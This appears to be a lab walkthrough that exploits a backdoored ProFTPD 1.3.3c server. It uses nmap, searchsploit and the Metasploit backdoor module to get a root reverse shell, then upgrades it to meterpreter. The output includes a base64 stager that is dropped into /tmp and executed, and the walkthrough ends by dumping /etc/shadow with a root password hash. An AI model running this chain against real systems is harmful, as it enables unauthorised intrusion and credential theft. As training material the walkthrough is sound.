# `exploiting ProFTPD and getting shell` on the target (searhsploit found that it is vulnerable and there is a metasploit module to exploit this)

root@attackdefense:~#` nmap 192.37.7.3 -sV`
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-30 10:33 UTC
Nmap scan report for target-1 (192.37.7.3)
Host is up (0.000021s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3c
MAC Address: 02:42:C0:25:07:03 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.51 seconds

root@attackdefense:~# `searchsploit ProFTPD`
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                                                                    |  Path
                                                                                                                                                                                                  | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
FreeBSD - 'ftpd / ProFTPd' Remote Command Execution                                                                                                                                               | exploits/freebsd/remote/18181.txt
ProFTPd 1.2.0 pre10 - Remote Denial of Service                                                                                                                                                    | exploits/linux/dos/244.java
ProFTPd 1.2.0 rc2 - Memory Leakage                                                                                                                                                                | exploits/linux/dos/241.c
ProFTPd 1.2.10 - Remote Users Enumeration                                                                                                                                                         | exploits/linux/remote/581.c
ProFTPd 1.2 < 1.3.0 (Linux) - 'sreplace' Remote Buffer Overflow (Metasploit)                                                                                                                      | exploits/linux/remote/16852.rb
ProFTPd 1.2.7/1.2.8 - '.ASCII' File Transfer Buffer Overrun                                                                                                                                       | exploits/linux/dos/23170.c
ProFTPd 1.2.7 < 1.2.9rc2 - Remote Code Execution / Brute Force                                                                                                                                    | exploits/linux/remote/110.c
ProFTPd 1.2.9 RC1 - 'mod_sql' SQL Injection                                                                                                                                                       | exploits/linux/remote/43.pl
ProFTPd 1.2.9 rc2 - '.ASCII' File Remote Code Execution (1)                                                                                                                                       | exploits/linux/remote/107.c
ProFTPd 1.2.9 rc2 - '.ASCII' File Remote Code Execution (2)                                                                                                                                       | exploits/linux/remote/3021.txt
ProFTPd 1.2 pre1/pre2/pre3/pre4/pre5 - Remote Buffer Overflow (1)                                                                                                                                 | exploits/linux/remote/19475.c
ProFTPd 1.2 pre1/pre2/pre3/pre4/pre5 - Remote Buffer Overflow (2)                                                                                                                                 | exploits/linux/remote/19476.c
ProFTPd 1.2 pre6 - 'snprintf' Remote Root                                                                                                                                                         | exploits/linux/remote/19503.txt
ProFTPd 1.2 - 'SIZE' Remote Denial of Service                                                                                                                                                     | exploits/linux/dos/20536.java
ProFTPd 1.2.x - 'STAT' Denial of Service                                                                                                                                                          | exploits/linux/dos/22079.sh
ProFTPd 1.3.0/1.3.0a - 'mod_ctrls' exec-shield Local Overflow                                                                                                                                     | exploits/linux/local/3730.txt
ProFTPd 1.3.0/1.3.0a - 'mod_ctrls' 'support' Local Buffer Overflow (1)                                                                                                                            | exploits/linux/local/3330.pl
ProFTPd 1.3.0/1.3.0a - 'mod_ctrls' 'support' Local Buffer Overflow (2)                                                                                                                            | exploits/linux/local/3333.pl
ProFTPd 1.3.0a - 'mod_ctrls' 'support' Local Buffer Overflow (PoC)                                                                                                                                | exploits/linux/dos/2928.py
ProFTPd 1.3.0 (OpenSUSE) - 'mod_ctrls' Local Stack Overflow                                                                                                                                       | exploits/unix/local/10044.pl
ProFTPd 1.3.0 - 'sreplace' Remote Stack Overflow (Metasploit)                                                                                                                                     | exploits/linux/remote/2856.pm
ProFTPd 1.3.2 rc3 < 1.3.3b (FreeBSD) - Telnet IAC Buffer Overflow (Metasploit)                                                                                                                    | exploits/linux/remote/16878.rb
ProFTPd 1.3.2 rc3 < 1.3.3b (Linux) - Telnet IAC Buffer Overflow (Metasploit)                                                                                                                      | exploits/linux/remote/16851.rb
ProFTPd-1.3.3c - Backdoor Command Execution (Metasploit)                                                                                                                                          | exploits/linux/remote/16921.rb
ProFTPd 1.3.3c - Compromised Source Backdoor Remote Code Execution                                                                                                                                | exploits/linux/remote/15662.txt
ProFTPd 1.3.5 - File Copy                                                                                                                                                                         | exploits/linux/remote/36742.txt
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                                                                                         | exploits/linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                                                                                               | exploits/linux/remote/36803.py
ProFTPd 1.3 - 'mod_sql' 'Username' SQL Injection                                                                                                                                                  | exploits/multiple/remote/32798.pl
ProFTPd 1.x - 'mod_tls' Remote Buffer Overflow                                                                                                                                                    | exploits/linux/remote/4312.c
ProFTPd - 'ftpdctl' 'pr_ctrls_connect' Local Overflow                                                                                                                                             | exploits/linux/local/394.c
ProFTPd IAC 1.3.x - Remote Command Execution                                                                                                                                                      | exploits/linux/remote/15449.pl
ProFTPd - 'mod_mysql' Authentication Bypass                                                                                                                                                       | exploits/multiple/remote/8037.txt
ProFTPd - 'mod_sftp' Integer Overflow Denial of Service (PoC)                                                                                                                                     | exploits/linux/dos/16129.txt
WU-FTPD 2.4/2.5/2.6 / Trolltech ftpd 1.2 / ProFTPd 1.2 / BeroFTPD 1.3.4 FTP - glob Expansion                                                                                                      | exploits/linux/remote/20690.sh
WU-FTPD 2.4.2 / SCO Open Server 5.0.5 / ProFTPd 1.2 pre1 - 'realpath' Remote Buffer Overflow (1)                                                                                                  | exploits/linux/remote/19086.c
WU-FTPD 2.4.2 / SCO Open Server 5.0.5 / ProFTPd 1.2 pre1 - 'realpath' Remote Buffer Overflow (2)                                                                                                  | exploits/linux/remote/19087.c
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result
root@attackdefense:~# `msfconsole`
msf5 > `search proftpd`

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/freebsd/ftp/proftp_telnet_iac        2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)
   1  exploit/linux/ftp/proftp_sreplace            2006-11-26       great      Yes    ProFTPD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)
   2  exploit/linux/ftp/proftp_telnet_iac          2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
   3  exploit/linux/misc/netsupport_manager_agent  2011-01-08       average    No     NetSupport Manager Agent Remote Buffer Overflow
   4  exploit/unix/ftp/proftpd_133c_backdoor       2010-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution
   5  exploit/unix/ftp/proftpd_modcopy_exec        2015-04-22       excellent  Yes    ProFTPD 1.3.5 Mod_Copy Command Execution


msf5 > `use 4`
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > `options`

Module options (exploit/unix/ftp/proftpd_133c_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(unix/ftp/proftpd_133c_backdoor) > `set RHOSTS 192.37.7.3`
RHOSTS => 192.37.7.3
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > `exploit`

[*] Started reverse TCP double handler on 192.37.7.2:4444 
[*] 192.37.7.3:21 - Sending Backdoor Command
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo l1ZDyO6zrsODJrtw;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "l1ZDyO6zrsODJrtw\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (192.37.7.2:4444 -> 192.37.7.3:59348) at 2023-12-30 10:40:04 +0000

`whoami`
root


# Now lets have a bash session started by giving bash binary name with interactive flag - /bin/bash -i

`whoami`
root
`/bin/bash -i`
bash: cannot set terminal process group (9): Inappropriate ioctl for device
bash: no job control in this shell
root@victim-1:/# `whoami`
whoami
root
root@victim-1:/#` id`
id
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
root@victim-1:/# 

# We saw we already have root privilege, but lets backgroung this shell session and upgrade this to a meterpreter session for us
root@victim-1:/# `^Z`
Background session 1? [y/N]  `y`
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > `sessions`

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               192.37.7.2:4444 -> 192.37.7.3:59348 (192.37.7.3)

msf5 exploit(unix/ftp/proftpd_133c_backdoor) > `search shell_to_meter`

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


msf5 exploit(unix/ftp/proftpd_133c_backdoor) > `use 0`
msf5 post(multi/manage/shell_to_meterpreter) > `options`

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.

msf5 post(multi/manage/shell_to_meterpreter) > `set SESSION 1`
SESSION => 1
msf5 post(multi/manage/shell_to_meterpreter) > `run`

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.37.7.2:4433 
[*] Sending stage (980808 bytes) to 192.37.7.3
[*] Meterpreter session 2 opened (192.37.7.2:4433 -> 192.37.7.3:60052) at 2023-12-30 10:48:57 +0000
[-] Error: Unable to execute the following command: "echo -n f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1towCUHAmgCABFRieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZsmqwA82AhcB4Av/huAEAAAC7AQAAAM2A>>'/tmp/AeCVR.b64' ; ((which base64 >&2 && base64 -d -) || (which base64 >&2 && base64 --decode -) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2> /dev/null > '/tmp/gykGT' < '/tmp/AeCVR.b64' ; chmod +x '/tmp/gykGT' ; '/tmp/gykGT' & sleep 2 ; rm -f '/tmp/gykGT' ; rm -f '/tmp/AeCVR.b64'"
[-] Output: "[1] 42"
[*] Post module execution completed
msf5 exploit(multi/manage/shell_to_meterpreter) > `sessions`

Active sessions
===============

  Id  Name  Type                   Information                                                     Connection
  --  ----  ----                   -----------                                                     ----------
  1         shell cmd/unix                                                                         192.37.7.2:4444 -> 192.37.7.3:59348 (192.37.7.3)
  2         meterpreter x86/linux  no-user @ victim-1 (uid=0, gid=0, euid=0, egid=0) @ 192.37.7.3  192.37.7.2:4433 -> 192.37.7.3:60052 (192.37.7.3)
msf5 post(multi/manage/shell_to_meterpreter) > `sessions -i 2`
[*] Starting interaction with 2...

meterpreter > 

# `NOTE` - There is a smiple way to upgrade session to meterpreter session by `-u` flag using sessions command by providing SESSION Id

msf5 post(multi/manage/shell_to_meterpreter) > `sessions -u 1`
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.37.7.2:4433 
[*] Sending stage (980808 bytes) to 192.37.7.3
[*] Meterpreter session 3 opened (192.37.7.2:4433 -> 192.37.7.3:44224) at 2023-12-30 11:01:33 +0000
[-] Error: Unable to execute the following command: "echo -n f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1towCUHAmgCABFRieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZsmqwA82AhcB4Av/huAEAAAC7AQAAAM2A>>'/tmp/UBTot.b64' ; ((which base64 >&2 && base64 -d -) || (which base64 >&2 && base64 --decode -) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2> /dev/null > '/tmp/cYBvf' < '/tmp/UBTot.b64' ; chmod +x '/tmp/cYBvf' ; '/tmp/cYBvf' & sleep 2 ; rm -f '/tmp/cYBvf' ; rm -f '/tmp/UBTot.b64'"
[-] Output: "[2] 52"
msf5 post(multi/manage/shell_to_meterpreter) > `sessions`

Active sessions
===============

  Id  Name  Type                   Information                                                     Connection
  --  ----  ----                   -----------                                                     ----------
  1         shell cmd/unix                                                                         192.37.7.2:4444 -> 192.37.7.3:59348 (192.37.7.3)
  2         meterpreter x86/linux  no-user @ victim-1 (uid=0, gid=0, euid=0, egid=0) @ 192.37.7.3  192.37.7.2:4433 -> 192.37.7.3:60052 (192.37.7.3)
  3         meterpreter x86/linux  no-user @ victim-1 (uid=0, gid=0, euid=0, egid=0) @ 192.37.7.3  192.37.7.2:4433 -> 192.37.7.3:44224 (192.37.7.3)

msf5 post(multi/manage/shell_to_meterpreter) > 


# Now lets look at system, we observe that its a 64 bit system and `uid=0 which means its root user`

msf5 post(multi/manage/shell_to_meterpreter) > `sessions 2`
[*] Starting interaction with 2...

meterpreter > `sysinfo`
Computer     : 192.37.7.3
OS           : Ubuntu 18.04 (Linux 5.4.0-153-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > `getuid`
Server username: no-user @ victim-1 (uid=0, gid=0, euid=0, egid=0)
meterpreter > 

# lets look at password hash ie shadow file, we observe that hash has `$6$` which means that this password has been hashed using `SHA-512` hashing algorithm

meterpreter > `cat /etc/shadow`
root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:18348:0:99999:7:::
daemon:*:18311:0:99999:7:::
bin:*:18311:0:99999:7:::
sys:*:18311:0:99999:7:::
sync:*:18311:0:99999:7:::
games:*:18311:0:99999:7:::
man:*:18311:0:99999:7:::
lp:*:18311:0:99999:7:::
mail:*:18311:0:99999:7:::
news:*:18311:0:99999:7:::
uucp:*:18311:0:99999:7:::
proxy:*:18311:0:99999:7:::
www-data:*:18311:0:99999:7:::
backup:*:18311:0:99999:7:::
list:*:18311:0:99999:7:::
irc:*:18311:0:99999:7:::
gnats:*:18311:0:99999:7:::
nobody:*:18311:0:99999:7:::
_apt:*:18311:0:99999:7:::
meterpreter > 